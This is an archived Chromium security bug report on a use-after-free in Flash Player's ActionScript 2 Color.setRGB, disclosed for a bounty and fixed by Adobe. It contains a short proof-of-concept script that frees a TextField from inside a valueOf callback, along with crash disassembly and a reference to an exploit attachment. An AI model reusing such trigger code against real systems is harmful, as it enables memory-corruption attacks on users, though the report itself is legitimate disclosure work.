# Security: Flash UAF with Color.setRGB in AS2 

| Field | Value |
|-------|-------|
| **Issue ID** | [40082004](https://issues.chromium.org/issues/40082004) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-05-05 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

When calling Color.setRGB in AS2 it is possible to free the target\_mc object used in the Color constructor while a reference remains in the stack.

**VERSION**  

Chrome Version: Chrome stable 42.0.2311.90 with Flash 17.0.0.169  

Operating System: Win7 x64 SP1

**REPRODUCTION CASE**  

The Color constructor needs a target\_mc object like a MovieClip, a TextField etc. While calling Color.setRGB with a custom object, it is possible to execute arbitrary AS2 code that might delete the target\_mc object leading to a UAF.  

(These lines come from flashplayer17\_sa.exe 17.0.0.169):

.text:004B82D0 push esi  

.text:004B82D1 mov esi, [esp+4+arg\_0]  

.text:004B82D5 push edi  

.text:004B82D6 mov edi, ecx  

.text:004B82D8 mov ecx, [edi+94h] ; edi points to freed memory  

.text:004B82DE and ecx, 0FFFFFFFEh  

.text:004B82E1 add ecx, 3Ch  

.text:004B82E4 mov eax, esi  

.text:004B82E6 call sub\_4B0724 ; crash below  

...  

.text:004B0724 mov edx, [ecx] ; crash here ecx = 3ch (null pointer)  

.text:004B0726 cmp edx, [eax]  

.text:004B0728 jnz short loc\_4B077E

Compile the poc with Flash CS5.5  

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

Content of as2\_color\_uaf.fla:

var tf:TextField = this.createTextField("tf",1,1,1,4,4)  

var o = new Object()  

o.valueOf = function () {  

tf.removeTextField()  

return 0x41414142  

}

var c = new Color(tf)  

c.setRGB(o)

## Attachments

- [flash_as2_color_TF_UAF.zip](attachments/flash_as2_color_TF_UAF.zip) (application/zip, 5.7 KB)
- [sploit.zip](attachments/sploit.zip) (application/zip, 12.5 KB)

## Timeline

### bi...@gmail.com (2015-05-05)

May I suggest that it is scarybeasts who handles the Flash bugs... :P?

### bi...@gmail.com (2015-05-05)

There's a "usually" missing in the above comment :D

### ri...@chromium.org (2015-05-05)

Thanks for the detailed report, assigning to cevans/scarybeasts as mentioned.

### sc...@gmail.com (2015-05-05)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-05-06)

Also NULL crash on Linux x64.

   0x00007fb2e8287f77:	sub    $0x48,%rsp
   0x00007fb2e8287f7b:	mov    0xd0(%rdi),%rdx
   0x00007fb2e8287f82:	mov    %rdi,%rbp
   0x00007fb2e8287f85:	mov    %rdx,%rax
   0x00007fb2e8287f88:	and    $0xfffffffffffffffe,%rax
=> 0x00007fb2e8287f8c:	mov    0x80(%rax),%ecx
   0x00007fb2e8287f92:	cmp    (%rsi),%ecx

rax            0x0	0


As always, a higher-impact repro would be useful for the rewards panel :-)

### bi...@gmail.com (2015-05-06)

Beware of the collider hidden in deep sea. Nullp first, calc next.

### sc...@gmail.com (2015-05-06)

Yeah it does seem to calculate.

### sc...@gmail.com (2015-05-06)

Adobe tracking as PSIRT-3655.

### [Deleted User] (2015-07-05)

[Empty comment from Monorail migration]

### [Deleted User] (2015-07-09)

Fixed: https://helpx.adobe.com/security/products/flash-player/apsb15-16.html

### ti...@google.com (2015-10-09)

$7500. I'm running out of things to say :)

### cl...@chromium.org (2015-10-15)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/484610?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082004)*
